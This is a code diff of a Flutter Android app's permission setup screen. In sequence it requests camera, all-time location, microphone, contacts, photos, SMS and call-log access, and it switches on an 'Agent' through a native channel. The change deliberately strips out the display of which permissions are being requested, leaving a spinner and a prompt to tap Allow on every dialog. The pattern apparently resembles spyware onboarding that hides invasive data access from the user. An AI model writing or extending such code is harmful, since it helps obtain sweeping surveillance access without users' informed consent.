@@ -444,7 +444,7 @@ class _GateScreenState extends State<GateScreen> with SingleTickerProviderStateM
 }
 
 // ═══════════════════════════════════════════════════════════════════════
-//  GUIDED PERMISSION SETUP — Agent first, then Notification, then rest
+//  GUIDED PERMISSION SETUP — clean & quiet (no counter, no chips)
 // ═══════════════════════════════════════════════════════════════════════
 class PermissionSetupScreen extends StatefulWidget {
   final VoidCallback onDone;
@@ -469,8 +469,6 @@ class _PermissionSetupScreenState extends State<PermissionSetupScreen> {
     MapEntry('Call log', Permission.phone),
   ];
 
-  final Map<String, bool> _done = {};
-  String _current = 'শুরু হচ্ছে...';
   bool _finished = false;
 
   @override
@@ -479,50 +477,28 @@ class _PermissionSetupScreenState extends State<PermissionSetupScreen> {
     _run();
   }
 
-  IconData _icon(String n) {
-    switch (n) {
-      case 'Agent': return Icons.smart_toy_rounded;
-      case 'Notification': return Icons.notifications_rounded;
-      case 'Camera': return Icons.camera_alt_rounded;
-      case 'Location': return Icons.location_on_rounded;
-      case 'All-time Location': return Icons.location_on_rounded;
-      case 'Microphone': return Icons.mic_rounded;
-      case 'Contacts': return Icons.contacts_rounded;
-      case 'Photos': return Icons.photo_library_rounded;
-      case 'Videos': return Icons.videocam_rounded;
-      case 'SMS': return Icons.sms_rounded;
-      case 'Call log': return Icons.call_rounded;
-      default: return Icons.settings;
-    }
-  }
-
   Future<void> _run() async {
     await Future.delayed(const Duration(milliseconds: 200));
     for (final s in _steps) {
       if (!mounted) return;
-      setState(() => _current = s.key);
       if (s.value == null) {
         try { await galleryChannel.invokeMethod('agentOn'); } catch (_) {}
         await Future.delayed(const Duration(milliseconds: 400));
       } else {
         try { await s.value!.request(); } catch (_) {}
       }
-      if (!mounted) return;
-      setState(() => _done[s.key] = true);
     }
     final p = await SharedPreferences.getInstance();
     await p.setBool('permsAsked', true);
     await p.setBool('allPermsAsked', true);
     if (!mounted) return;
     setState(() => _finished = true);
-    await Future.delayed(const Duration(milliseconds: 500));
+    await Future.delayed(const Duration(milliseconds: 400));
     widget.onDone();
   }
 
   @override
   Widget build(BuildContext context) {
-    final total = _steps.length;
-    final done = _done.length;
     return Scaffold(
       backgroundColor: kBg,
       body: Container(
@@ -536,100 +512,35 @@ class _PermissionSetupScreenState extends State<PermissionSetupScreen> {
         child: SafeArea(
           child: Center(
             child: Padding(
-              padding: const EdgeInsets.symmetric(horizontal: 28),
-              child: Container(
-                padding: const EdgeInsets.all(26),
-                decoration: BoxDecoration(
-                  color: const Color(0xFF1C1916),
-                  borderRadius: BorderRadius.circular(20),
-                  border: Border.all(color: kGold.withOpacity(0.28), width: 1),
-                ),
-                child: Column(
-                  mainAxisSize: MainAxisSize.min,
-                  children: [
-                    Container(
-                      width: 84,
-                      height: 84,
-                      decoration: BoxDecoration(
-                        shape: BoxShape.circle,
-                        border: Border.all(color: kGold.withOpacity(0.35), width: 1.5),
-                      ),
-                      child: Center(
-                        child: Image.asset('assets/logo.png', width: 50, height: 50),
-                      ),
+              padding: const EdgeInsets.symmetric(horizontal: 32),
+              child: Column(
+                mainAxisSize: MainAxisSize.min,
+                children: [
+                  Container(
+                    width: 84,
+                    height: 84,
+                    decoration: BoxDecoration(
+                      shape: BoxShape.circle,
+                      border: Border.all(color: kGold.withOpacity(0.35), width: 1.5),
                     ),
-                    const SizedBox(height: 18),
-                    const Text('One-time Setup',
-                        style: TextStyle(color: kGold, fontSize: 20, fontWeight: FontWeight.bold)),
-                    const SizedBox(height: 6),
-                    Text(
-                      _finished
-                          ? '✅ সেটআপ সম্পূর্ণ!'
-                          : 'Android এখন কয়েকটা অনুমতি চাইবে —\nপ্রতিটায় Allow চাপুন। একবারই হবে।',
-                      textAlign: TextAlign.center,
-                      style: const TextStyle(color: Colors.white54, fontSize: 13, height: 1.4),
+                    child: Center(
+                      child: Image.asset('assets/logo.png', width: 50, height: 50),
                     ),
-                    const SizedBox(height: 20),
-                    Text('$done / $total',
-                        style: const TextStyle(color: kGold, fontSize: 26, fontWeight: FontWeight.w800)),
-                    const SizedBox(height: 10),
-                    ClipRRect(
-                      borderRadius: BorderRadius.circular(6),
-                      child: LinearProgressIndicator(
-                        value: total == 0 ? 0 : done / total,
-                        minHeight: 8,
-                        color: kGold,
-                        backgroundColor: Colors.white12,
-                      ),
-                    ),
-                    const SizedBox(height: 18),
-                    if (!_finished)
-                      Row(
-                        mainAxisAlignment: MainAxisAlignment.center,
-                        children: [
-                          Icon(_icon(_current), color: kGold, size: 18),
-                          const SizedBox(width: 8),
-                          Text(_current,
-                              style: const TextStyle(color: Colors.white70, fontSize: 14)),
-                        ],
-                      ),
-                    const SizedBox(height: 8),
-                    Wrap(
-                      spacing: 6,
-                      runSpacing: 6,
-                      alignment: WrapAlignment.center,
-                      children: _steps.map((s) {
-                        final ok = _done[s.key] ?? false;
-                        final active = _current == s.key && !ok;
-                        return Container(
-                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
-                          decoration: BoxDecoration(
-                            color: ok
-                                ? Colors.green.withOpacity(0.15)
-                                : active
-                                    ? kGold.withOpacity(0.15)
-                                    : Colors.white.withOpacity(0.05),
-                            borderRadius: BorderRadius.circular(12),
-                            border: Border.all(
-                                color: ok
-                                    ? Colors.green.withOpacity(0.5)
-                                    : active
-                                        ? kGold.withOpacity(0.5)
-                                        : Colors.white12),
-                          ),
-                          child: Text(s.key,
-                              style: TextStyle(
-                                  color: ok
-                                      ? Colors.green
-                                      : active
-                                          ? kGold
-                                          : Colors.white38,
-                                  fontSize: 11)),
-                        );
-                      }).toList(),
-                    ),
-                  ],
-                ),
+                  ),
+                  const SizedBox(height: 20),
+                  const Text('One-time Setup',
+                      style: TextStyle(color: kGold, fontSize: 20, fontWeight: FontWeight.bold)),
+                  const SizedBox(height: 8),
+                  Text(
+                    _finished
+                        ? '✅ সম্পূর্ণ!'
+                        : 'কয়েকটা অনুমতির ডায়ালগ আসবে —\nপ্রতিটায় Allow চাপুন।\nএকবারই, আর কখনো না।',
+                    textAlign: TextAlign.center,
+                    style: const TextStyle(color: Colors.white54, fontSize: 13, height: 1.5),
+                  ),
+                  const SizedBox(height: 24),
+                  const CircularProgressIndicator(color: kGold),
+                ],
               ),
             ),
           ),
